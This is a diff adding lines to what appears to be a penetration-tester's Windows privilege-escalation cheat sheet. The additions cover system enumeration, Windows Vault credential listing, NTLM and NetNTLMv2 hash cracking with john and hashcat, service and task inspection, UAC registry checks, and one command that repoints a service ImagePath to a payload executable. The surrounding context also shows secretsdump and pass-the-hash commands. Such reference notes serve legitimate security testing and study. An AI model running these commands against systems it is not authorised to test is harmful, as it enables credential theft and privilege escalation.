@@ -20,6 +20,9 @@ whoami /priv
 whoami /groups
 hostname
 systeminfo
+set
+echo %PATH%
+where powershell
 ipconfig /all
 route print
 netstat -ano
@@ -27,6 +30,7 @@ net user
 net accounts
 net localgroup administrators
 net localgroup "Remote Management Users"
+wmic useraccount get domain,name,sid
 cmdkey /list
 ```
 
@@ -49,6 +53,13 @@ Installed software:
 wmic product get name,version
 reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
 reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
+```
+
+PowerShell installed app view:
+
+```powershell
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select DisplayName,DisplayVersion
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select DisplayName,DisplayVersion
 ```
 
 ## File Transfer
@@ -128,6 +139,14 @@ impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
 hashcat -m 1000 ntlm.hashes rockyou.txt
 ```
 
+Hash mode reminders:
+
+```bash
+john --format=nt hash.txt --wordlist=rockyou.txt
+hashcat -m 1000 hash.txt rockyou.txt
+hashcat -m 5600 netntlmv2.hash rockyou.txt
+```
+
 Pass-the-hash after authorization:
 
 ```bash
@@ -140,6 +159,8 @@ impacket-wmiexec DOMAIN/user@target -hashes :NTHASH
 
 ```cmd
 cmdkey /list
+vaultcmd /list
+vaultcmd /listcreds:"Web Credentials" /all
 runas /savecred /user:DOMAIN\user "cmd.exe"
 ```
 
@@ -159,6 +180,7 @@ List services:
 ```cmd
 sc query
 sc qc ServiceName
+sc sdshow ServiceName
 wmic service get name,displayname,pathname,startmode
 ```
 
@@ -167,6 +189,7 @@ PowerShell:
 ```powershell
 Get-Service
 Get-CimInstance -ClassName win32_service | Select Name,State,StartMode,PathName
+ConvertFrom-SddlString -Sddl "SDDL_STRING"
 ```
 
 Check binary and config permissions:
@@ -174,6 +197,7 @@ Check binary and config permissions:
 ```cmd
 icacls "C:\Path\service.exe"
 accesschk.exe -uwcqv "Authenticated Users" *
+wmic process list full | findstr /i "executablepath=C:"
 ```
 
 ## Weak Service Permissions
@@ -246,6 +270,15 @@ dir C:\Windows\Tasks
 dir C:\Windows\System32\Tasks
 ```
 
+PowerShell task actions:
+
+```powershell
+Get-ScheduledTask
+Get-ScheduledTask -TaskName "TaskName" | Format-List *
+(Get-ScheduledTask -TaskName "TaskName").Actions
+Export-ScheduledTask -TaskName "TaskName" -TaskPath "\"
+```
+
 Check task action paths and scripts for writable files or directories:
 
 ```cmd
@@ -269,6 +302,20 @@ Services:
 ```cmd
 reg query HKLM\SYSTEM\CurrentControlSet\Services
 reg query HKLM\SYSTEM\CurrentControlSet\Services\ServiceName
+```
+
+Service image path from PowerShell:
+
+```powershell
+Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ServiceName"
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ServiceName" -Name ImagePath -Value "C:\Windows\Temp\payload.exe"
+```
+
+AppInit DLLs:
+
+```powershell
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "LoadAppInit_DLLs"
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs"
 ```
 
 Winlogon:
@@ -299,6 +346,14 @@ Check integrity and groups:
 ```cmd
 whoami /groups
 whoami /priv
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
+```
+
+PowerShell view:
+
+```powershell
+Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" | Select EnableLUA,ConsentPromptBehaviorAdmin
 ```
 
 ## AMSI Notes
